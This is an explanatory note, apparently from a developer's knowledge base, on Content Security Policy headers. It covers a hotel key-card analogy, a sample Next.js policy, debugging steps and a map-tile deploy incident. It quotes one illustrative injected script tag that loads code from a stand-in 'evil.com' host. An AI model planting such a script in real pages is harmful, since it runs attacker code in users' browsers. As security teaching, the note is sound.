# Content Security Policy (CSP)

## What it is
A browser security header your server sends with every response. It tells the browser: *"only load resources (images, scripts, fonts, API calls) from these approved domains. Block everything else."* A safety net against injected malicious content.

## Tourism translation
A hotel key-card access list. Only approved doors open for a given guest. To let in a new vendor (say, a new laundry service), the hotel has to add them to the key list first. If the vendor shows up and tries to get in without being listed, the door stays locked.

If an attacker somehow smuggled a fake ID through the front desk, they still can't open the guest-room doors — because those doors are on a separate allowlist.

## When you'd see it
- Any production web app worth its salt has a CSP
- When your map tiles, fonts, images, or analytics script mysteriously fail to load in production but work in dev
- When browser console shows: `Refused to load the image 'https://...' because it violates the following Content Security Policy directive`

## Why it matters
Without CSP: if an attacker injects a malicious `<script src="evil.com/hack.js">` into your page (through XSS, a compromised dependency, or a stored-markup vulnerability), the browser happily loads and runs it. With CSP: the browser blocks it because `evil.com` isn't on the allowlist.

It's defense-in-depth. Your other mitigations (input sanitization, parameterized queries) are the primary locks; CSP is the second lock in case someone picks the first.

## The policy pieces
Each CSP directive controls one kind of resource:
```
default-src 'self'                          # fallback — only our own origin
script-src 'self' 'unsafe-eval'             # JS can come from us + allow eval
style-src 'self' https://fonts.googleapis.com
font-src 'self' https://fonts.gstatic.com
img-src 'self' data: blob:
  https://hostaway-platform.s3.us-west-2.amazonaws.com
  https://*.basemaps.cartocdn.com
connect-src 'self' https://api.anthropic.com
frame-ancestors 'none'                      # can't be embedded in iframes
```

Wildcards like `*.cartocdn.com` work for subdomains. `data:` and `blob:` allow inline data URLs.

## Why you'll hit this
Every time you integrate a new external service (maps, analytics, fonts, image CDN), you have to add it to the right CSP directive. If you don't, the resource is silently blocked and your feature appears "broken" only in production.

## Debugging
- Open browser DevTools → Console → look for `Refused to load...` messages
- Check Response headers → `Content-Security-Policy` → read what's allowed
- Copy the blocked URL's domain → add it to the matching directive → redeploy

## Gotchas
- CSP is set at the server level (in Next.js, via `next.config.mjs` headers). Changes require a redeploy.
- **Wildcards are one level only**: `*.cartocdn.com` matches `a.cartocdn.com` and `b.cartocdn.com`, but NOT `a.b.cartocdn.com`.
- `'unsafe-eval'` and `'unsafe-inline'` weaken protections — avoid if possible, but some libraries (like Tailwind dev mode) require them.
- Browser cached the old policy? Hard-refresh or wait out the max-age.

## Learned from
FLOHOM Marina Placement Dashboard deploy (Apr 21, 2026). After shipping the map, tiles failed to load in production. The CSP's `img-src` directive only allowed `self`, `hostaway-platform.s3`, and `*.googleusercontent.com`. CartoDB tile CDN was silently blocked. Added `https://*.basemaps.cartocdn.com` and `https://*.openstreetmap.org` to `img-src`, redeployed, tiles loaded. Dev environment didn't catch it because Next.js dev mode doesn't apply production CSP.
